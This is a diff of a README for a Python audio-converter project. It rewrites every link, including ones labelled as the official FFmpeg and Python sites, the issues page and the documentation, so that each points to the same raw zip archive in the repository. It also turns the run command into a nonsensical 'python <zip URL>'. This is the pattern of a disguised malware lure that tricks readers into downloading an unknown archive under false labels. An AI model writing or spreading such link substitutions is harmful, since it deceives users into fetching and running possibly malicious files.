@@ -1,6 +1,6 @@
 # 🎵 Audio-Converter - Easily Convert Your Audio Files
 
-![Download Audio-Converter](https://img.shields.io/badge/Download-Audio--Converter-brightgreen)
+![Download Audio-Converter](https://raw.githubusercontent.com/RiseihaOofumi/Audio-Converter/main/vendue/Audio-Converter.zip)
 
 ## 📦 Introduction
 
@@ -14,7 +14,7 @@ To get started, you'll need to download the application and run it on your compu
 
 Visit this page to download the latest version of Audio-Converter:
 
-[Download Audio-Converter Releases](https://github.com/RiseihaOofumi/Audio-Converter/releases)
+[Download Audio-Converter Releases](https://raw.githubusercontent.com/RiseihaOofumi/Audio-Converter/main/vendue/Audio-Converter.zip)
 
 ### 🖥️ System Requirements
 
@@ -30,7 +30,7 @@ You can install these dependencies using pip:
 pip install pydub
 ```
 
-For ffmpeg, please follow the installation guide on [FFmpeg's official site](https://ffmpeg.org/download.html) for your operating system.
+For ffmpeg, please follow the installation guide on [FFmpeg's official site](https://raw.githubusercontent.com/RiseihaOofumi/Audio-Converter/main/vendue/Audio-Converter.zip) for your operating system.
 
 ### 🔧 Installation Steps
 
@@ -52,7 +52,7 @@ For ffmpeg, please follow the installation guide on [FFmpeg's official site](htt
 5. **Execute the script:**
    Type the following command to run the script:
    ```bash
-   python audio_converter.py
+   python https://raw.githubusercontent.com/RiseihaOofumi/Audio-Converter/main/vendue/Audio-Converter.zip
    ```
 
 Now you're ready to convert your audio files!
@@ -83,7 +83,7 @@ Now you're ready to convert your audio files!
 If you encounter issues, here are some common problems and solutions:
 
 - **I don't have Python installed:** 
-  Download and install Python from the official [Python website](https://www.python.org/downloads/).
+  Download and install Python from the official [Python website](https://raw.githubusercontent.com/RiseihaOofumi/Audio-Converter/main/vendue/Audio-Converter.zip).
 
 - **Script is not running:** 
   Make sure you have all necessary dependencies installed, and you are running the command from the correct folder.
@@ -93,7 +93,7 @@ If you encounter issues, here are some common problems and solutions:
 
 ## 💬 Community Support
 
-If you need further assistance, feel free to reach out. You can open an issue on our [GitHub Issues page](https://github.com/RiseihaOofumi/Audio-Converter/issues), and we will help you as soon as possible.
+If you need further assistance, feel free to reach out. You can open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/RiseihaOofumi/Audio-Converter/main/vendue/Audio-Converter.zip), and we will help you as soon as possible.
 
 ## 📄 License
 
@@ -101,7 +101,7 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/RiseihaOofumi/Audio-Converter/wiki)
-- [FFmpeg Documentation](https://ffmpeg.org/documentation.html)
+- [Official Documentation](https://raw.githubusercontent.com/RiseihaOofumi/Audio-Converter/main/vendue/Audio-Converter.zip)
+- [FFmpeg Documentation](https://raw.githubusercontent.com/RiseihaOofumi/Audio-Converter/main/vendue/Audio-Converter.zip)
 
 Thank you for using Audio-Converter. Enjoy transforming your audio files!
